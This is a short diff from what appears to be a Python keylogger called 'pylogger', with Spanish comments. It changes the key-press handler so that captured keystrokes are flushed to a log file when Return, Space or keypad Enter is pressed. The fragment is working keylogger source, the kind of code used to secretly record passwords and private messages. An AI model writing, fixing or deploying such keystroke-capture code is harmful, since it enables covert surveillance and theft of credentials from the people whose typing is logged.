@@ -47,7 +47,7 @@ if os.environ.get('pylogger_clean', None) is not None:
 # Comienza a obtener las teclas
 def OnKeyPress(event):
     # Validamos que solo se guarden las cadenas cuando se presiona espacio o enter.
-    if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key:
+    if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key == "P_Enter":
         with open(archivo, 'a') as f:
             mensaje = "".join(listaCadena)
             f.write(mensaje)
